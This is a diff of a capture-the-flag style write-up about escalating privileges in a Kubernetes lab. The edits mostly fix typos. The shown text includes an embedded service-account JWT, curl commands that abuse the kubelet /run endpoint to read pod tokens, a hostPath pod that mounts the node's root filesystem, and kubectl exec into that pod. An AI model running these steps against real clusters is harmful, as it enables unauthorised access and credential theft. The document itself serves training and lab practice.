@@ -166,7 +166,7 @@ This looks like an exposed api
 
 ### Kubernetes 
 ```
-I've never really used Kubernete, more of a docker guy so over to google to start leaning 
+I've never really used Kubernetes, more of a docker guy so over to google to start learning 
 
 Useful Cheatsheet 
 https://kubernetes.io/docs/reference/kubectl/cheatsheet/
@@ -184,13 +184,13 @@ i.e. docker ps will list containers running in docker
 ```
 ### kubectl
 ```
-which kubectl nothing there, after finding a page on how to install 
+which kubectl --> nothing there, after finding a page on how to install 
 
 https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/
 
 Then realised we couldnt download into the box directly, so needed to think outside the box (sorry for the pun!)
 
-Over to the attack box (I use the Kali attack box I fel it has more functionality)
+Over to the attack box (I use the Kali attack box I felt it has more functionality)
 
 So download kubectl to attack box using the curl command below 
 
@@ -223,7 +223,7 @@ https://kubernetes.io/docs/reference/kubectl/cheatsheet/
 ### Using kubectl
 
 ```
-Again the ablve cheatsheets helped me alot lets see whatg we have 
+Again the above cheatsheets helped me alot lets see what we have 
 
 ./kubectl get pods 
 
@@ -249,11 +249,11 @@ kube-system   kube-scheduler-minikube            1/1     Running   14 (204d ago)
 kube-system   storage-provisioner                1/1     Running   24 (36m ago)    262d
 
 
-I'm guessing this one is the one im interested in :  jumpbox-admin-7d56d4b67d-tcpt6 
+I'm guessing this one is the one we're interested in :  jumpbox-admin-7d56d4b67d-tcpt6 
 
 ```
 ```
-So went in on one trying to start a pod and attacxh /root to it but got no where fast, reading some bits i realised i needed a token to escalate some privleges 
+So went in on one trying to start a pod and attach /root to it but got no where fast, reading some bits I realised I needed a token to escalate some privleges 
 ```
 ### Googling kubernetes token location 
 ```
@@ -306,7 +306,7 @@ I exported the token
 
 export token=eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjk1ODAwOTM1LCJpYXQiOjE2NjQyNjQ5MzUsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJqdW1wYm94LTZjNzU0OTQ3N2MtZGh0NGYiLCJ1aWQiOiJhY2MwYTcwNS1kY2UzLTQxYzItYmFiYy0xNmZmYjExOWM1MzkifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6Im5vZGVwcm94eSIsInVpZCI6IjVmZmZlOGI4LWIyOTYtNGQ2NS1iYzc4LTA2N2Y3MDg3YzNkYyJ9LCJ3YXJuYWZ0ZXIiOjE2NjQyNjg1NDJ9LCJuYmYiOjE2NjQyNjQ5MzUsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0Om5vZGVwcm94eSJ9.DUAlboILjKmA0oYrNA1DIIUKdEESHqrMNE3uP_O0amFQq3VuyLtHU6VSi68lq0HYn6BmCLlieCDIrKvu5Oys1gnMCPQTxgl1W4F2etNOluQB9eJh3OKuetZlKl17rwU4T99bbYPtrluieQFbGeB-B19Wtkv63ZZFy2wwHh8iJYghRwEJvodRas7a0a46qTf3q8bFavpI7fgbHqWmZnGn9En2mEp37Bus8T9_-sgD55P9Qk9b2amvEEw-xwLEVAm-4epkTCcz3Mz_u10zIQUOl4V0_P-rahPGslTPGGcDUg8bm2mPUIv3noBGACvsKvS2A7IIWwnGWiX0Zexrs5L16A
 
-now with this all i had to do was call $token ... RIGHT!
+now with this all I had to do was call $token ... RIGHT!
 ```
 ### NO
 ```
@@ -319,7 +319,7 @@ no good to me
 ```
 ### api exploit 
 ```
-Googled around and found a decent writeup on how to exploit the API port using tokens
+Googled around and found a decent writeup / video on how to exploit the API port using tokens
 
 https://blog.aquasec.com/privilege-escalation-kubernetes-rbac
 
@@ -331,7 +331,7 @@ https://blog.aquasec.com/privilege-escalation-kubernetes-rbac
 
 In the video he shows how the exploit works
 
-after more googling to see what /kube-system/cilium-2vb9h/clilium-agent meant i found a way to print out in yaml 
+after more googling to see what /kube-system/cilium-2vb9h/clilium-agent meant I found a way to print out in yaml 
 
 ./kubectl get nodes -o yaml 
 
@@ -380,10 +380,11 @@ items:
 ```
 So /kube-system/cilium-2vb9h/clilium-agent in my system is 
 
+/kube-system/jumpbox-admin-7d56d4b67d-tcpt6/ubuntu
 
 curl -k -H "Authorization: Bearer $token" -XPOST https://172.17.0.4:10250/run/kube-system/jumpbox-admin-7d56d4b67d-tcpt6/ubuntu -d "cmd=cat /run/secrets/kubernetes.io/serviceaccount/token"
 
-however it failed and I only by chance seen i was using the wrong ip address 
+however it failed and I only by chance seen I was using the wrong ip address 
 
 - working 
 curl -k -H "Authorization: Bearer $token" -XPOST https://172.17.0.1:10250/run/kube-system/jumpbox-admin-7d56d4b67d-tcpt6/ubuntu -d "cmd=cat /run/secrets/kubernetes.io/serviceaccount/token"
@@ -391,7 +392,7 @@ curl -k -H "Authorization: Bearer $token" -XPOST https://172.17.0.1:10250/run/ku
 ```
 ![Working](images/api2.png)
 ```
-eyJhbGciOiJSUzI1NiIsImtpZCI6Im82QU1WNV9qNEIwYlV3YnBGb1NXQ25UeUtmVzNZZXZQZjhPZUtUb21jcjQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjk1ODAzODYxLCJpYXQiOjE2NjQyNjc4NjEsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInBvZCI6eyJuYW1lIjoianVtcGJveC1hZG1pbi03ZDU2ZDRiNjdkLXRjcHQ2IiwidWlkIjoiYjdhNjliYTAtOTJiZC00OTEzLWEwODctM2EwYjExMWQ1NzgyIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJhZG1pbiIsInVpZCI6ImY5MTI1N2ZjLWJmMjQtNGJiYS04OTZkLWZlYjdkOWM2NzU1MiJ9LCJ3YXJuYWZ0ZXIiOjE2NjQyNzE0Njh9LCJuYmYiOjE2NjQyNjc4NjEsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDprdWJlLXN5c3RlbTphZG1pbiJ9.AQvWmRcb8TbCk7Cy5nrFA755zalJ5tvSfSj4ObRldnNURb8cb-iZx9MU2C5ZAln-T_H_Swiw6wW9MVVW22wqIQ2vP08DJEqbHPCj5k51KWztezRwmO-lsLTQ479EBfYroQNte3Ew-8BaTS332USW0P1ybcMPeNJHqY1cwyhmkHtBCK3u0sENvjcOq9hQ6dEvw6GoA3JFaMJsh2rK8fiPYMvBucVhlFs9Pp57uobt7rei-HMkqT_d66Cb_LMN-xNL2ZkfsbJQ27SSLM4VgfJCBdsA4u2MfnQKlwIFVuTYfTsvR0ZQsL-NAQdD_fAVK1ceJxeV08T71oI4L8oWQbm0Ug
+Admin Token [REDACTED]
 
 ```
 ### Admin token
@@ -404,7 +405,7 @@ https://pulsesecurity.co.nz/advisories/microk8s-privilege-escalation
 
 ```
 ```
-Export he admin token same way as before 
+Export the admin token same way as before 
 
 apiVersion: v1
 kind: Pod
@@ -428,8 +429,9 @@ spec:
       type: Directory
 ```
 ```
-I used the above and the pod failed to load, i found out it couldn't pull the ubuntu:latest images so i edited the yaml to one of the current images within the system 
+I used the above and the pod failed to load, iI found out it couldn't pull the ubuntu:latest images so I edited the yaml to one of the current images within the system 
 
+./kubectl get nodes --token=$token -o yaml : got a print out of all nodes available tried a few until I got this one 
 
 apiVersion: v1
 kind: Pod
@@ -457,11 +459,11 @@ spec:
 
 ### interacting with the pod 
 ```
-Just like Docker witrh some added annoying bits 
+Just like Docker with some added annoying bits 
 
 ./kubectl exec -it hostmount -- sh --token=$token
 
-didnt work and i thought i'd done something wrong again but i realised the token was in the wrong place 
+didnt work and Ithought Id done something wrong again but I realised the token was in the wrong place 
 
 ./kubectl exec -it hostmount --token=$token -- sh 
 
@@ -473,7 +475,9 @@ didnt work and i thought i'd done something wrong again but i realised the token
 ```
 So the root is attached within the pod as /opt/root 
 
-the cd root 
+csd /opt/root 
+
+then cd root 
 
 ls 
 ```
